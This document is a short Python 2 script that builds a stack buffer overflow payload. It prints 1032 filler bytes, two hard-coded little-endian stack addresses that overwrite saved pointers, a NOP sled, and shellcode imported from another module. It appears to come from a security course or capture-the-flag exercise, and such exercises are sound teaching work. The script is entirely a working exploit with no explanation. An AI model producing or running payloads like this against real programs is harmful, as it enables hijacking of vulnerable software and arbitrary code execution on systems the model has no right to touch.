from struct import pack
from shellcode import shellcode
print '\x60'*1032+pack("<I", 0xbffedf88)+pack("<I", 0xbffedf60)+'\x90'*0x110+shellcode
